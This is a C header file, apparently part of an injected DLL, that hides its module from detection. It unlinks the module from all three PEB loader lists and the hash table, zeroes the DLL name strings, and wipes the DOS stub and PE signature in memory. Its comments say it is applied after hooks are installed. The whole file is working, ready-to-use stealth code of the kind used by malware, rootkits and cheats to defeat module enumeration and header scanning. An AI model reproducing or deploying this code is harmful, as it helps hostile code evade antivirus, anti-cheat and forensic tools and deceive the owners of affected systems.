/******************************************************************************
 * Module Stealth - PEB Unlink & Module Hiding
 *
 * Removes our DLL from the PEB loader data tables so that
 * EnumProcessModules / CreateToolhelp32Snapshot / NtQueryVirtualMemory
 * cannot enumerate us.
 *
 * IMPORTANT: Call AFTER all initialization is complete (hooks installed,
 * PE headers wiped). Once unlinked, GetModuleHandle on our DLL will fail.
 ******************************************************************************/

#pragma once

#pragma warning(push)
#pragma warning(disable : 4201)    // unnamed struct/union

#include <windows.h>
#include <winternl.h>    // for PPEB, UNICODE_STRING, PEB_LDR_DATA (partial)

// ============================================================================
// Internal structures — winternl.h provides incomplete definitions,
// so we define what we need directly.
// ============================================================================

// Full PEB_LDR_DATA (winternl.h only has a partial definition)
typedef struct _PEB_LDR_DATA_FULL {
  ULONG Length;
  BOOLEAN Initialized;
  PVOID SsHandle;
  LIST_ENTRY InLoadOrderModuleList;
  LIST_ENTRY InMemoryOrderModuleList;
  LIST_ENTRY InInitializationOrderModuleList;
  PVOID EntryInProgress;
} PEB_LDR_DATA_FULL, *PPEB_LDR_DATA_FULL;

// Extended LDR_DATA_TABLE_ENTRY for Windows 10/11 with HashLinks
typedef struct _LDR_DATA_TABLE_ENTRY_FULL {
  LIST_ENTRY InLoadOrderLinks;
  LIST_ENTRY InMemoryOrderLinks;
  LIST_ENTRY InInitializationOrderLinks;
  PVOID DllBase;
  PVOID EntryPoint;
  ULONG SizeOfImage;
  UNICODE_STRING FullDllName;
  UNICODE_STRING BaseDllName;
  ULONG Flags;
  USHORT LoadCount;
  USHORT TlsIndex;
  union {
    LIST_ENTRY HashLinks;
    struct {
      PVOID SectionPointer;
      ULONG CheckSum;
    };
  };
  union {
    ULONG TimeDateStamp;
    PVOID LoadedImports;
  };
} LDR_DATA_TABLE_ENTRY_FULL, *PLDR_DATA_TABLE_ENTRY_FULL;

// ============================================================================
// Helper: Safely unlink a LIST_ENTRY from its doubly-linked list
// ============================================================================
static inline void SafeUnlinkEntry(LIST_ENTRY *entry)
{
  if(entry->Flink && entry->Blink)
  {
    entry->Flink->Blink = entry->Blink;
    entry->Blink->Flink = entry->Flink;
    // Point to self (standard "removed" state)
    entry->Flink = entry;
    entry->Blink = entry;
  }
}

// ============================================================================
// PEB Unlink: Remove module from all loader lists
// ============================================================================
static BOOL UnlinkModuleFromPEB(HMODULE hModule)
{
  __try
  {
    // Get PEB via TEB (x64: GS:[0x60], x86: FS:[0x30])
#ifdef _WIN64
    PPEB pPEB = (PPEB)__readgsqword(0x60);
#else
    PPEB pPEB = (PPEB)__readfsdword(0x30);
#endif

    if(!pPEB || !pPEB->Ldr)
      return FALSE;

    // Cast to our full definition that includes InLoadOrderModuleList
    PPEB_LDR_DATA_FULL pLdr = (PPEB_LDR_DATA_FULL)pPEB->Ldr;

    // Walk InLoadOrderModuleList to find our entry
    PLIST_ENTRY head = &pLdr->InLoadOrderModuleList;
    PLIST_ENTRY current = head->Flink;

    while(current != head)
    {
      PLDR_DATA_TABLE_ENTRY_FULL entry =
          CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY_FULL, InLoadOrderLinks);

      if(entry->DllBase == (PVOID)hModule)
      {
        // Unlink from all three PEB lists
        SafeUnlinkEntry(&entry->InLoadOrderLinks);
        SafeUnlinkEntry(&entry->InMemoryOrderLinks);
        SafeUnlinkEntry(&entry->InInitializationOrderLinks);

        // Unlink from hash table (Windows 10/11)
        // The HashLinks field is used by LdrpHashTable for fast lookup
        SafeUnlinkEntry(&entry->HashLinks);

        // Zero out the DLL name strings to prevent string scanning
        if(entry->BaseDllName.Buffer)
        {
          DWORD oldProtect;
          if(VirtualProtect(entry->BaseDllName.Buffer,
                            entry->BaseDllName.MaximumLength,
                            PAGE_READWRITE, &oldProtect))
          {
            SecureZeroMemory(entry->BaseDllName.Buffer, entry->BaseDllName.MaximumLength);
            VirtualProtect(entry->BaseDllName.Buffer,
                           entry->BaseDllName.MaximumLength,
                           oldProtect, &oldProtect);
          }
          entry->BaseDllName.Length = 0;
        }

        if(entry->FullDllName.Buffer)
        {
          DWORD oldProtect;
          if(VirtualProtect(entry->FullDllName.Buffer,
                            entry->FullDllName.MaximumLength,
                            PAGE_READWRITE, &oldProtect))
          {
            SecureZeroMemory(entry->FullDllName.Buffer, entry->FullDllName.MaximumLength);
            VirtualProtect(entry->FullDllName.Buffer,
                           entry->FullDllName.MaximumLength,
                           oldProtect, &oldProtect);
          }
          entry->FullDllName.Length = 0;
        }

        return TRUE;
      }

      current = current->Flink;
    }
  }
  __except(EXCEPTION_EXECUTE_HANDLER)
  {
    // Silently handle any access violations
  }

  return FALSE;
}

// ============================================================================
// Combined stealth: PE wipe + PEB unlink
// ============================================================================
static void ApplyModuleStealth(HMODULE hModule)
{
  // Step 1: Wipe only the identifying signatures in the PE header.
  // We intentionally preserve the DataDirectory (especially the resource
  // directory entry) so that FindResource / GetDynamicEmbeddedResource
  // keeps working after stealth is applied.
  // Wiping MZ + PE signatures is sufficient to defeat naive header scanners;
  // full header erasure would break our own resource lookups.
  __try
  {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    if(pDos->e_magic == IMAGE_DOS_SIGNATURE)
    {
      PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE *)hModule + pDos->e_lfanew);
      if(pNt->Signature == IMAGE_NT_SIGNATURE)
      {
        DWORD oldProtect = 0;
        if(VirtualProtect(hModule, pDos->e_lfanew + sizeof(DWORD), PAGE_READWRITE, &oldProtect))
        {
          // Zero DOS stub up to (but not including) the NT headers,
          // then wipe just the NT signature DWORD.
          SecureZeroMemory(hModule, pDos->e_lfanew);
          pNt->Signature = 0;
          VirtualProtect(hModule, pDos->e_lfanew + sizeof(DWORD), oldProtect, &oldProtect);
        }
      }
    }
  }
  __except(EXCEPTION_EXECUTE_HANDLER) {}

  // Step 2: Unlink from PEB loader data tables
  UnlinkModuleFromPEB(hModule);
}

#pragma warning(pop)
